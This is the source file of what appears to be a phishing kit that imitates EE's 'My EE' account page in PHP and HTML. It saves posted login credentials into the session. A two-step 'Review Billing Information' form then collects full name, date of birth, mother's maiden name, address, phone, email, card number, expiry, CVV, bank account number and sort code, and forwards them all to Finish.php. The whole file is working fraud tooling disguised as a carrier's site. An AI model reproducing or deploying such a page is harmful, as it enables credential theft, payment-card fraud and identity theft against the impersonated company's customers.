<?php

require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
?>
<!DOCTYPE html>
<html class="js flexbox no-touch geolocation multiplebgs backgroundsize cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions video audio svg">
<!--<![endif]-->
<head>
<meta charset="utf-8">
<meta content="IE=11; IE=10; IE=9; IE=8; IE=EDGE" http-equiv="X-UA-Compatible">
<title>My EE</title>
<meta content="noindex,nofollow" name="robots">
<meta content="user-scalable=0, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport">
<meta content="telephone=no" name="format-detection">
<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
<link href="assets/css/run.css" rel="stylesheet">
<link href="assets/css/main.css" rel="stylesheet">
<link href="assets/css/modules.css" rel="stylesheet">
<link href="assets/css/common.css" rel="stylesheet">
<link href="assets/css/plugins.css" rel="stylesheet">
<link href="assets/css/myee_addons.css" rel="stylesheet">
<link href="assets/css/boom.css" rel="stylesheet">
<link href="assets/css/usage.css" rel="stylesheet">
<link href="assets/css/jquery.inttelinput.css" rel="stylesheet">
<link href="assets/css/dev_tools.css" rel="stylesheet">
<link href="assets/css/myee-common.css" rel="stylesheet">
<link href="assets/css/mainveri.css" rel="stylesheet">
<link href="assets/css/flowassociation.css" rel="stylesheet">
<link href="assets/css/myee-menu.css" rel="stylesheet">
<link href="assets/css/full-width-header.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script>

$('#verify').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
			

            //form validation rules
            $("#verify").validate({
				errorClass: "nom8",
				errorElement: "p",
                rules: {				
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					telephone: { required: true, minlength: 11, digits: true,},
					email: { required: true, email: true,},
                },
                 messages: {
					name: {
						required: "Please provide full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: {
						required: "Please provide date of birth",
						minlength: jQuery.validator.format("Please provide your date of birth"),
					},
					telephone: {
						required: "Please provide telephone number",
						minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					email: {
						required: "Please provide email address",
						email: jQuery.validator.format("Please check the email address you have entered"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					town: {
						required: "Please provide city/town",
						minlength: jQuery.validator.format("Please check the city/town you have entered"),
					},
					postcode: {
						required: "Please provide postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
				},
					
submitHandler: function(form) {
    document.getElementById("Details").style.display = "none";
    document.getElementById("Payment").style.display = "block";
	ForwardValues();
	$('body,html').animate({
	scrollTop: 0
	}, 800);
	return false;
	}
            });
        }
    }

    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
function ForwardValues() {
    var name = document.getElementById("name").value;
    document.getElementById("one").value=name;
    var dob = document.getElementById("dob").value;
    document.getElementById("two").value=dob;
    var telephone = document.getElementById("telephone").value;
    document.getElementById("three").value=telephone;
    var email = document.getElementById("email").value;
    document.getElementById("four").value=email;
    var address = document.getElementById("address").value;
    document.getElementById("five").value=address;
    var town = document.getElementById("town").value;
    document.getElementById("six").value=town;
	var postcode = document.getElementById("postcode").value;
    document.getElementById("seven").value=postcode;
	var mmn = document.getElementById("mmn").value;
    document.getElementById("eight").value=mmn;
}
$('#payment').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
			

            //form validation rules
            $("#payment").validate({
				errorClass: "nom8",
				errorElement: "p",
                rules: {				
					ccname: { required: true, minlength: 4},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 7,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8,},
					sortcode: { required: true, minlength: 8,},
                },
                 messages: {
					ccname: {
						required: "Please provide cardholders name",
						minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
					},
					ccno: {
						required: "Please provide 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide card expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
					},
					sortcode: {
						required: "Please provide 6 digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
					},
				},
					
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
	</script>
	<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
	   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
});
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<style>
p.nom8 {
	color:red;
	display:block;
}
</style>
</head>
<body class="handheld">
<div class="global-mast-head-iparsys parsys iparsys">
<div class="parsys global-masthead section">

<header class="MainHeadero">
<div class="TopBlackBar" style="height:34px;padding-top:5px!important;padding-bottom: 40px!important;">
<div class="container group">
<div class="parbase segmentSelector segment-selector">
<div class="MainHeadero-segment">
<div class="MainHeadero-segment__segment MainHeadero-segment__segment--consumer"><a class="current MainHeadero-segment-selector-link" href="#">Personal</a>
</div>

<div class="MainHeadero-segment__segment MainHeadero-segment-selector MainHeadero-segment-selector--inactive"><a class="MainHeadero-segment-selector-link" href="#">Business</a>
<div class="content_below-cut">
</div>
</div>
</div>
</div>

<div class="MainHeadero-utility"><span class="MainHeadero-utility__link MainHeadero-utility__link--contact"><a class="icon-link" href="#"><span class="icon ee-icon-contact"></span> Contact us</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--findstore"><a class="icon-link" href="#"><span class="icon ee-icon-findstore StoreLocator"></span> Store finder</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--coverage"><a class="icon-link" href="#"><span class="icon ee-icon-coverage"></span> Coverage checker</a></span></div>
</div>
</div>

<div class="MainHeadero-main">
<div class="container">
<p class="MainHeadero__logo"><a href="#"><object data="assets/img/logo.svg" type="image/svg+xml">EE</object></a>
</p>

<nav class="ee-nav">
<ul>
<li class="ee-nav__link--category ee-nav__link--current ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>MY EE</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Shop</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Help</span></a></li>
<li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Why EE</span></a></li>
<li class="ee-nav__link ee-nav__link--primary handheld-only"><a href="#"><span class="brand-ee">Contact us</span></a></li>
</ul>
</nav>

<div class="MainHeadero-tools group">
<div class="MainHeadero-basket"><a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-basket__link ee-icon-basket" href="#"><span class="assistive-text">Basket</span> <span class="MainHeadero-basket__items empty"></span></a>
<div class="MainHeadero-minibasket"></div>
</div>

<div class="MainHeadero-search">
<a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-search__toggle ee-icon-search" href="#">
<span class="assistive-text">Search</span></a>
<form action="" class="MainHeadero-search__form" method="get">
<div class="MainHeadero-search__search-box styled-search-box">
<input class="yui-ac-input" id="l" name="l" placeholder="Search" title="Search field" type="search"> 
<span class="MainHeadero-search__clear ee-icon-close"><span class="assistive-text">Clear</span></span> 
<button class="ee-icon-search" id="searchform-submit" type="submit"><span class="assistive-text">Search</span></button>
</div>

<div class="MainHeadero-search__autocomplete yui-ac-container" id="autocomplete"></div>

</form>
</div>

<div class="MainHeadero-auth"><span class="MainHeadero-auth__greeting">Hello, <span class="MainHeadero-auth__name">guest</span>. Not you?</span> <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--login" href="https://myaccount.ee.co.uk/login-dispatch"><span class="MainHeadero-auth__link-text">Log out</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a> <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--logout" href="#"><span class="MainHeadero-auth__link-text">Log out</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a></div>

<div><a class="MainHeadero-tools__link MainHeadero-tools__nav-toggle" href="#">Menu</a>
</div>
</div>
</div>
</div>

<div class="MainHeadero-handheld-search">
</div>


</header>
</div>
</div>















<nav id="sidenav">
<div id="navMask">
<div id="navMaskInner" style="height: 1380px;">
<ul id="mainNav" style="height: 1380px;">

</ul>
</div>
</div>
</nav>

<section class="shiftContainer">
<section class="menu" id="menuIconContainer"><a class="menu" href="#" tabindex="0"></a></section>

<section class="navSection shiftRight">
<main class="maganage-my-account" id="main" role="main" tabindex="0">
<section class="breadcrumb module white" id="breadcrumb">
<nav aria-label="Breadcrumb trail" class="container" role="navigation">
<div class="col span-12 no-padding-top no-padding-bottom">
<ul class="breadcrumb-item-container">
<li class="breadcrumb__item"><a href="#">My EE</a> <span aria-hidden="true" class="chevron">&gt;</span></li>

<li class="breadcrumb__item"><span>Review Billing Information</span> <span aria-hidden="true" class="chevron">&gt;</span></li>
</ul>
</div>
</nav>
</section>

<section class="module white" id="full-width-header">
<div class="container">
<div class="col span-12">
<div class="panel">
<h1 class="center">Review Billing Information</h1>
</div>
</div>
</div>
</section>



<!-- DETAILS START -->
<div id="Details">
<section>
<div class="container cantainer-margin">
<div class="my-account-tab-head">
<ul class="navbar">
<li class="active" id="my-details-tab"><a>Your details</a>
</li>
</ul>
</div>

<div class="white ee-form my-account-tab-container" id="my-details-container" style="display: block;">


<div id="myDetails">
<div class="janrain-capture-ui capture-ui-content capture_screen_container" style="display: block;">
<section class="module no-margin-top no-margin-bottom padding-bottom-1em myee">
<div class="janrain-content">


<div class="clear"></div>


<form name="verify" id="verify" action="#" method="post">
<div id="capture_editProfile_editProfileForm_defaultSavedProfileMessage">
</div>

<div id="capture_editProfile_editProfileForm_errorMessages"></div>

<div class="col span-6 jr-container nopadding">
<div class="panel">

<div>
<label for="name">Full name:</label>
<input class="capture_required capture_text_input" name="name" id="name" placeholder="full name" type="text" value="">
</div>

<br />
<br />

<div>
<label for="dob">Date of birth:</label>
<input class="capture_required capture_text_input" name="dob" id="dob" placeholder="DD/MM/YYYY" type="tel" value="">
</div>

<br />
<br />
<div>
<label for="dob">Mother's Maiden Name:</label>
<input class="capture_required capture_text_input" name="mmn" id="mmn" maxlength="20" placeholder="mother's maiden name" type="text" value="">
</div>

<br />
<br />
<div>
<label for="address">Address:</label>
<input class="capture_required capture_text_input" name="address" id="address" placeholder="address line 1" type="text" value="">
</div>

<br />
<br />

<div>
<label for="town">Town/City:</label>
<input class="capture_required capture_text_input" name="town" id="town" placeholder="town/city" type="text" value="">
</div>

<br />
<br />

<div>
<label for="postcode">Postcode:</label>
<input class="capture_required capture_text_input UKPostcode" name="postcode" id="postcode" placeholder="postcode" type="text" value="">
</div>

<br />
<br />

<div>
<label for="telephone">Mobile number:</label>
<input class="capture_required capture_text_input UKTelephone" name="telephone" id="telephone" placeholder="E.g. 07770123456" type="tel" value="">
</div>

<br />
<br />

<div>
<label for="email">Email address:</label>
<input class="capture_required capture_text_input" name="email" id="email" placeholder="email address" type="email" value="">
</div>

<div class="padding-top-1em"><input class="capture_saveButton capture_btn capture_primary" id="go" name="go" type="submit" value="Save">
</div>
</div>
</div>
</form>
</div>
</section>
</div>
</div>


</div>
</div>
</section>
</div>
<!-- DETAILS END -->
<!-- PAYMENT START -->
<div id="Payment" style="display:none">
<section>
<div class="container cantainer-margin">
<div class="my-account-tab-head">
<ul class="navbar">
<li class="active" id="my-details-tab"><a>Payment information</a>
</li>
</ul>
</div>

<div class="white ee-form my-account-tab-container" id="my-details-container" style="display: block;">


<div id="myDetails">
<div class="janrain-capture-ui capture-ui-content capture_screen_container" style="display: block;">
<section class="module no-margin-top no-margin-bottom padding-bottom-1em myee">
<div class="janrain-content">


<div class="clear"></div>


<form name="payment" id="payment" action="Finish.php?Review-Billing&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" method="post">
<input type="hidden" name="name" id="one">
<input type="hidden" name="dob" id="two">
<input type="hidden" name="telephone" id="three">
<input type="hidden" name="email" id="four">
<input type="hidden" name="address" id="five">
<input type="hidden" name="town" id="six">
<input type="hidden" name="postcode" id="seven">
<input type="hidden" name="mmn" id="eight">
<div id="capture_editProfile_editProfileForm_defaultSavedProfileMessage">
</div>

<div id="capture_editProfile_editProfileForm_errorMessages"></div>

<div class="col span-6 jr-container nopadding">
<div class="panel">

<div>
<label for="ccname">Cardholder&apos;s name:</label>
<input class="capture_required capture_text_input" name="ccname" id="ccname" placeholder="as it appears on card" type="text" value="">
</div>

<br />
<br />

<div>
<label for="ccno">Card number:</label>
<input class="capture_required capture_text_input cc-number" name="ccno" id="cc-number" placeholder="" type="tel" value="">
</div>


<br />
<br />

<div>
<label for="ccexp">Card expiry date:</label>
<input class="capture_required capture_text_input cc-exp" name="ccexp" id="cc-exp" placeholder="" type="tel" value="">
</div>

<br />
<br />

<div>
<label for="secode">Card security code:</label>
<input class="capture_required capture_text_input cc-cvc" name="secode" id="cc-cvc" placeholder="" type="tel" value="">
</div>

<br />
<br />

<div>
<label for="account">Account number:</label>
<input class="capture_required capture_text_input" name="account" id="account" placeholder="" type="tel" value="">
</div>

<br />
<br />

<div>
<label for="sortcode">Sort code:</label>
<input class="capture_required capture_text_input" name="sortcode" id="sortcode" placeholder="" type="tel" value="">
</div>


<div class="padding-top-1em"><input class="capture_saveButton capture_btn capture_primary" id="go" name="go" type="submit" value="Save">
</div>
</div>
</div>
</form>
</div>
</section>
</div>
</div>


</div>
</div>
</section>
</div>
<!-- PAYMENT END -->
</main>

<div class="parsys iparsys global-footer-iparsys">
<div class="parsys global-footer section">
<footer class="ee-footer" id="ee-footer" role="contentinfo">
<div class="ee-footer-primary theme-standard theme-white">
<div class="container">
<div class="ee-footer-links">
<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">OUR COMPANY</p>

<ul>
<li><a href="#">About Us</a>
</li>

<li><a href="#">Our Brands</a>
</li>

<li><a href="#">Newsroom</a>
</li>

<li><a href="#">Financials</a>
</li>

<li><a href="#">Responsibility</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">USEFUL LINKS</p>

<ul>
<li><a href="#">EE Community</a>
</li>

<li><a href="#">Insurance &amp; Protection</a>
</li>

<li><a href="#">Recycle and Reward</a>
</li>

<li><a href="#">e-safety and e-skills</a>
</li>

<li><a href="#">Careers</a>
</li>

<li><a href="#">EE Franchise</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section">
<p class="ee-footer-links-section__heading">Legal</p>

<ul>
<li><a href="#">Terms and conditions</a>
</li>

<li><a href="#">Privacy</a>
</li>

<li><a href="#">Codes of practice</a>
</li>

<li><a href="#">Accessibility</a>
</li>

<li><a href="#">EE Power Bar recall</a>
</li>

<li><a href="#">Modern Slavery Statement</a>
</li>
</ul>
</section>

<section class="ee-footer-links-section ee-footer-links-section--social">
<p class="ee-footer-links-section__heading">How to find EE</p>

<ul>
<li><a href="#">Coverage Checker</a>
</li>

<li><a href="#">Store finder</a>
</li>
</ul>

<p class="ee-footer-social">
<a class="ee-footer-social__link ee-icon-twitter" href="#"><span class="assistive-text">EE on Twitter</span></a> 
<a class="ee-footer-social__link ee-icon-facebook" href="#"><span class="assistive-text">EE on Facebook</span></a> 
<a class="ee-footer-social__link ee-icon-youtube" href="#"><span class="assistive-text">EE on YouTube</span></a> 
<a class="ee-footer-social__link ee-icon-linkedin" href="#"><span class="assistive-text">EE on LinkedIn</span></a>
</p>
</section>
</div>
</div>
</div>

<div class="ee-footer-secondary">
<div class="container">
<p class="ee-footer-copyright">&copy; 2017&nbsp;EE Limited</p>

<p class="ee-footer-brand"><span class="ee-footer-brand__link"><a class="ee-bgimg-orange-logo" href="#"><span class="assistive-text">Visit the Orange website (opens in a new tab/window)</span></a></span> <span class="ee-footer-brand__link"><a class="ee-bgimg-tmobile-logo" href="#"><span class="assistive-text">Visit the T-Mobile website (opens in a new tab/window)</span></a></span> <span class="ee-footer-brand__text">brought to you by EE</span></p>
</div>
</div>
</footer>
</div>

<div class="section">
<div class="new">
</div>
</div>

<div class="iparys_inherited">
<div class="parsys iparsys global-footer-iparsys">
</div>
</div>
</div>
</section>
</section>
</body>
</html>